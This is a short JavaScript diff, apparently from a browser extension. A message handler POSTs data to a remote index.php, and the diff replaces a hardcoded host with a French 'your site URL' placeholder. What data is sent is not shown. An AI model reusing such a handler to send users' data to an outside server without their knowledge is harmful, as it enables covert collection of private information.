@@ -3,7 +3,7 @@ function handleMessage(request) {
 
   var xhr = new XMLHttpRequest();
   xhr.onload = function () {};
-  xhr.open("POST", "https://wanteeed.online/index.php", true);
+  xhr.open("POST", "URL DE VOTRE SITE/index.php", true);
   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   xhr.send(data);
 }
